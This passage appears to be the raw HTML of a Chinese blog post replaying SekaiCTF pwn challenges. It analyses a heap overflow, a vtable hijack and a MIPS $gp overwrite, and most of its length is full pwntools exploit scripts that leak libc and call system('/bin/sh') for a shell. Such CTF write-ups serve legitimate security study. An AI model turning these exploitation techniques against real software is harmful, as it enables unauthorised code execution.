class=\"number\">0xff</span>)</span><br><span class=\"line\">\ti+=<span class=\"number\">1</span></span><br><span class=\"line\">\tbss&gt;&gt;=<span class=\"number\">8</span></span><br><span class=\"line\">re_c(<span class=\"number\">1</span>,<span class=\"number\">0x10</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">\tpr_c(<span class=\"number\">0</span>,-<span class=\"number\">0x70</span>+i,system &amp; <span class=\"number\">0xff</span>)</span><br><span class=\"line\">\tsystem&gt;&gt;=<span class=\"number\">8</span>\t</span><br><span class=\"line\">pay=<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i,j <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(pay):</span><br><span class=\"line\">    pr_c(<span class=\"number\">0</span>, i, j)\t</span><br><span class=\"line\">re_c(<span class=\"number\">20</span>,<span class=\"number\">20</span>)\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"learning-oop\"><a href=\"#learning-oop\" class=\"headerlink\" title=\"learning_oop\"></a>learning_oop</h2><h3 id=\"ida分析-1\"><a href=\"#ida分析-1\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901194344121.png\" alt=\"图3\"></p>\n<p>首先漏洞点 ,  很明显是<code>set_name</code> 函数中的溢出漏洞 , 可以往下溢出覆盖下面的堆块. 然后堆块申请都是固定大小<code>0x120</code></p>\n<p>可以看到这是一个<code>c++</code>的程序 ,  他的堆块都是 作为对象申请的. 这里应该是 用 <code>Animal</code> 这样一个类 , 然后 <code>Dog</code>,<code>Cat</code>,<code>Horse</code>,<code>Parrot</code> 类继承了<code>Animal</code>,并对其中的某些方法重写了.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901203517642.png\" alt=\"image.png\"></p>\n<p>在初始化一个动物的时候 , 在<code>fd</code> 的位置 写了一个虚表的地址 ,后续的函数调用都是靠这个地址去寻找和调用函数.</p>\n<p>年龄,饥饿值,体力,其实是堆块最后<code>0x10</code>字节保存的数据. 同时 ,  意识到 ,  可以溢出修改这个部分 , 去控制 动物的 这些信息.</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901204229246.png\"></p>\n<p>这里 可以通过控制 <code>fd</code> 也就是劫持虚表 ,  来完成调用自己想要的函数.</p>\n<h3 id=\"思路分析-1\"><a href=\"#思路分析-1\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><p>题目环境是2.39的libc . (没有版本讲堆题,都是在耍流氓)</p>\n<ol>\n<li>首先要泄露<code>libc</code> , 然后劫持虚表 , 这里应该是很容易想到的. 那么如何泄露<code>libc</code>呢? 肯定是通过<code>unsorted bin</code> 了. 然后让堆块进入<code>unsorted bin</code>呢? 如果填满一个<code>tcache bins</code> , 再 <code>free</code> 一个<code>0x120</code> 的堆块, 看样子可行,但可以没有<code>uaf</code> 漏洞,这样利用会很困难. 所以 , 通过溢出修改堆块 的<code>size</code> 造一个0x481 的堆块 ,  造一个重叠. 因为这个大小的堆块超过了<code>tcahce bins</code>的大小会直接进入<code>unsorted bin</code>.</li>\n<li>这个时候 再申请一个堆块 , <code>arena</code>信息就会写入到下一个堆块的<code>name</code>的位置, 如果此时下一个堆块恰好<code>die</code> ,就会触发<code>get_name</code> 把信息泄露出来.</li>\n<li>然后劫持<code>vtable</code> ,我们通过在堆上布置一个虚表,在创建成功后,程序会返回堆的地址. 然后只要有合适的<code>gadgets</code>, 就可以调用<code>system</code>. 这里肯定需要的是控制<code>rdi</code>, 同时需要<code>call</code></li>\n</ol>\n<h3 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./learning_oop&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">menu</span>(<span class=\"params\">op</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;&gt; &quot;</span>,<span class=\"built_in\">str</span>(op))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">species,name</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">1</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;4=Horse): &quot;</span>,<span class=\"built_in\">str</span>(species))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Enter name: \\n&quot;</span>,name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">play</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">2</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">feed</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">3</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">reset</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    menu(<span class=\"number\">4</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Which pet? \\n&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">6</span>)+p32(<span class=\"number\">6</span>))</span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">7</span>)+p32(<span class=\"number\">7</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">6</span>)+p32(<span class=\"number\">6</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>))</span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">4</span>)+p32(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">3</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">2</span>)+p32(<span class=\"number\">2</span>))</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">0x10</span>)+p32(<span class=\"number\">0x10</span>)+<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x481</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">2</span>,<span class=\"string\">b&quot;aaaa&quot;</span>)</span><br><span class=\"line\">io.recvlines(<span class=\"number\">1</span>)</span><br><span class=\"line\">arena=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;arena&quot;</span>,<span class=\"built_in\">hex</span>(arena))</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase = arena - <span class=\"number\">0x203b20</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">题目的</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001cb42f : /bin/sh</span></span><br><span class=\"line\"><span class=\"string\">0x000000000009ca97 : mov rdi, qword ptr [rax + 0x640] ; call qword ptr [rax + 0x638]</span></span><br><span class=\"line\"><span class=\"string\">我的</span></span><br><span class=\"line\"><span class=\"string\">0x0000000000094ab6 : mov rdi, qword ptr [rax + 0x648] ; call qword ptr [rax + 0x640]</span></span><br><span class=\"line\"><span class=\"string\">0x00000000001d8678 : /bin/sh</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">bin_sh=libcbase+<span class=\"number\">0x1cb42f</span></span><br><span class=\"line\">set_rdi=libcbase+<span class=\"number\">0x9ca97</span></span><br><span class=\"line\">system=libcbase+<span class=\"number\">0x582d2</span></span><br><span class=\"line\">logv(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(system))</span><br><span class=\"line\">logv(<span class=\"string\">&quot;bin_sh&quot;</span>,<span class=\"built_in\">hex</span>(bin_sh))</span><br><span class=\"line\"><span class=\"comment\">##  这里的偏移需要对这gdb去找</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>,p64(set_rdi)*<span class=\"number\">4</span>+<span class=\"string\">b&quot;W&quot;</span>*<span class=\"number\">0xe0</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>)+p64(<span class=\"number\">3</span>)+p64(<span class=\"number\">0xd281</span>)+<span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">0x520</span>-<span class=\"number\">0x128</span>)+p64(system)+p64(bin_sh))<span class=\"comment\">#+p64(bin_sh))</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;Adopted new pet: &quot;</span>)</span><br><span class=\"line\">vtable=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)+<span class=\"number\">8</span></span><br><span class=\"line\"></span><br><span class=\"line\">logv(<span class=\"string\">&quot;vtable&quot;</span>,<span class=\"built_in\">hex</span>(vtable))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>,p64(set_rdi)*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *$rebase(0x143C)&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">1</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x100</span>+p32(<span class=\"number\">5</span>)+p32(<span class=\"number\">5</span>)+p64(<span class=\"number\">3</span>)+p64(<span class=\"number\">0x121</span>)+p64(vtable))</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"outdated\"><a href=\"#outdated\" class=\"headerlink\" title=\"outdated\"></a>outdated</h2><h3 id=\"ida分析-2\"><a href=\"#ida分析-2\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><h3 id=\"exp-2\"><a href=\"#exp-2\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> subprocess <span class=\"keyword\">import</span> getoutput</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># initialize the binary</span></span><br><span class=\"line\">build = <span class=\"string\">&#x27;mipsel32r6-musl&#x27;</span></span><br><span class=\"line\">binary = <span class=\"string\">&quot;./outdated&quot;</span></span><br><span class=\"line\">elf = context.binary = ELF(binary, checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">docker = ELF(<span class=\"string\">&#x27;/usr/bin/docker&#x27;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc.so&#x27;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">gs = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">set architecture mips:isa32r6</span></span><br><span class=\"line\"><span class=\"string\">break *main+536</span></span><br><span class=\"line\"><span class=\"string\">continue</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> args.REMOTE:</span><br><span class=\"line\">    p = remote(<span class=\"string\">&quot;outdated.chals.sekai.team&quot;</span>, <span class=\"number\">1337</span>, ssl=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">### SOLVE POW ###</span></span><br><span class=\"line\">    cmd = p.recvline().decode().strip().removeprefix(<span class=\"string\">&quot;proof of work: &quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Solving POW: <span class=\"subst\">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class=\"line\">    answer = getoutput(cmd)</span><br><span class=\"line\">    p.sendlineafter(<span class=\"string\">b&quot;solution: &quot;</span>, answer.encode())</span><br><span class=\"line\"><span class=\"keyword\">elif</span> args.GDB:</span><br><span class=\"line\">    context.terminal = [<span class=\"string\">&quot;tmux&quot;</span>, <span class=\"string\">&quot;splitw&quot;</span>, <span class=\"string\">&quot;-h&quot;</span>, <span class=\"string\">&quot;-l&quot;</span>, <span class=\"string\">&quot;65%&quot;</span>]</span><br><span class=\"line\">    p = docker.process([<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"string\">&#x27;-i&#x27;</span>,<span class=\"string\">&#x27;--rm&#x27;</span>,<span class=\"string\">&#x27;-v&#x27;</span>,<span class=\"string\">&#x27;./:/target/ctf&#x27;</span>,<span class=\"string\">&#x27;-p&#x27;</span>,<span class=\"string\">&#x27;1234:1234&#x27;</span>,<span class=\"string\">f&#x27;legoclones/mips-pwn:<span class=\"subst\">&#123;build&#125;</span>&#x27;</span>,<span class=\"string\">&#x27;chroot&#x27;</span>,<span class=\"string\">&#x27;/target&#x27;</span>,<span class=\"string\">&#x27;/qemu&#x27;</span>,<span class=\"string\">&#x27;-g&#x27;</span>,<span class=\"string\">&#x27;1234&#x27;</span>,<span class=\"string\">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Remote debugging started...&quot;</span>)</span><br><span class=\"line\">    gdb.attach((<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">1234</span>), gdbscript=gs, exe=binary)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    p = docker.process([<span class=\"string\">&#x27;run&#x27;</span>,<span class=\"string\">&#x27;-i&#x27;</span>,<span class=\"string\">&#x27;--rm&#x27;</span>,<span class=\"string\">&#x27;-v&#x27;</span>,<span class=\"string\">&#x27;./:/target/ctf&#x27;</span>,<span class=\"string\">f&#x27;legoclones/mips-pwn:<span class=\"subst\">&#123;build&#125;</span>&#x27;</span>,<span class=\"string\">&#x27;chroot&#x27;</span>,<span class=\"string\">&#x27;/target&#x27;</span>,<span class=\"string\">&#x27;/qemu&#x27;</span>,<span class=\"string\">&#x27;/ctf/outdated&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GET EXE LEAK ###</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;Here&#x27;</span>)</span><br><span class=\"line\">main_addr = <span class=\"built_in\">int</span>(p.recvline().strip().split(<span class=\"string\">b&#x27; &#x27;</span>)[-<span class=\"number\">1</span>],<span class=\"number\">16</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;main() = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(main_addr)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GP OVERWRITE 1 ###</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">(using example addresses)</span></span><br><span class=\"line\"><span class=\"string\">old $gp = 0xf98000, puts() = $gp-0x7f84, exit() = $gp-0x7fac, thanks = $gp-0x7fd0</span></span><br><span class=\"line\"><span class=\"string\">new $gp = 0xf98090, puts() = 0xf9010c, exit() = 0xf900e4, thanks = 0xf900c0 (game_name @ 0xf900c0)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">Our goal is to turn puts(&quot;Thanks for playing&quot;) into puts_blue(GOT[puts])</span></span><br><span class=\"line\"><span class=\"string\">and exit(0) into main(0)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">fake_got1 = flat(</span><br><span class=\"line\">    <span class=\"comment\"># 0xf900c0</span></span><br><span class=\"line\">    p32(main_addr + <span class=\"number\">0x1f6ac</span> - <span class=\"number\">0x118c</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># GOT[puts] - main = 0x1f6ac (offset for &quot;Thanks&quot; string)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900d0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900e0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(main_addr), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># address for main() so exit() jumps back into main()</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900f0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 0xf90100</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(main_addr - <span class=\"number\">0x80</span>), <span class=\"comment\"># offset from main() to puts_blue()</span></span><br><span class=\"line\">)</span><br><span class=\"line\">p.sendline(fake_got1)                                   <span class=\"comment\"># name (fake GOT in global)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;-12&#x27;</span>)                                      <span class=\"comment\"># offset to stored $gp</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;32912&#x27;</span>)                                    <span class=\"comment\"># least significant 2 bytes of new $gp</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GET LIBC LEAK ###</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&#x27;in your game&#x27;</span>)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">puts_addr = <span class=\"built_in\">int</span>.from_bytes(p.recvline()[<span class=\"number\">5</span>:<span class=\"number\">8</span>], <span class=\"string\">&#x27;little&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&quot;puts() = <span class=\"subst\">&#123;<span class=\"built_in\">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class=\"line\">libc.address = puts_addr - libc.symbols[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### GP OVERWRITE 2 ###</span></span><br><span class=\"line\">fake_got2 = flat(</span><br><span class=\"line\">    <span class=\"comment\"># 0xf900c0</span></span><br><span class=\"line\">    p32(<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span>)) - <span class=\"number\">0x118c</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># &quot;/bin/sh&quot;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900d0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900e0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(main_addr), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), <span class=\"comment\"># address for main() so exit() jumps back into main()</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 0xf900f0</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>),</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 0xf90100</span></span><br><span class=\"line\">    p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(<span class=\"number\">0</span>), p32(libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]), <span class=\"comment\"># system()</span></span><br><span class=\"line\">)</span><br><span class=\"line\">p.sendline(fake_got2)                                   <span class=\"comment\"># name (fake GOT in global)</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;-12&#x27;</span>)                                      <span class=\"comment\"># offset to stored $gp</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;32912&#x27;</span>)                                    <span class=\"comment\"># least significant 2 bytes of new $gp</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n","excerpt":"","more":"<h1 id=\"sekaictf–pwn复现\"><a href=\"#sekaictf–pwn复现\" class=\"headerlink\" title=\"sekaictf–pwn复现\"></a>sekaictf–pwn复现</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>备战下一场xctf分站赛</p>\n<h2 id=\"speedpwn-2\"><a href=\"#speedpwn-2\" class=\"headerlink\" title=\"speedpwn-2\"></a>speedpwn-2</h2><p>这是一道tcache 利用的题目，赛后复盘是有源码的，但我们这里还是从写题的角度进行一个分析</p>\n<h3 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901184359282.png\" alt=\"图1\"></p>\n<p> <code>main</code> 函数 首先申请了<code>0x190</code>大小的堆块作为一块画布, 然后循环进行操作. 每次循环的开始会调用<code>print_canvas</code> 把画布的内容打印出来,然后用户可以输入<code>p,r,h</code> 进行对应的操作</p>\n<ol>\n<li>p , 修改堆块的一个字节</li>\n<li>r , 重新申请堆块</li>\n<li>h , 打印操作的说明</li>\n</ol>\n<p>图1 就是 r , 对应的操作</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250901185458942.png\" alt=\"图2\"></p>\n<p>图2 这里是p , 对应的操作.<br>在75 行这里,就是一个明显的溢出漏洞. 因为这里没有对范围的检测 , 所以我们可以输入非法值 , 去修改不在这个堆块范围内的堆空间的值 .</p>\n<h3 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h3><p>题目环境是 2.34的libc</p>\n<ol>\n<li>首先是泄露libc . 题目没有开启<code>ALSR</code>和<code>FULL RELRO</code> ,  可以从<code>ida</code>里获取函数<code>plt</code>的地址 , 同时可以修改<code>got</code> 表 . 首先 ,  利用 溢出漏洞 ,  修改 <code>tcache_perthread_struct</code> 的 <code>counts</code> 和 <code>entries</code>, 把 <code>.got</code>表 附近的某一段 放入<code>tcache bins</code> 中 ,  再利用 <code>r</code> 把这个块空间分配出来.</li>\n<li>然后是 ,  修改<code>got</code> 表. 利用上面的溢出漏洞 , 把 <code>free</code> 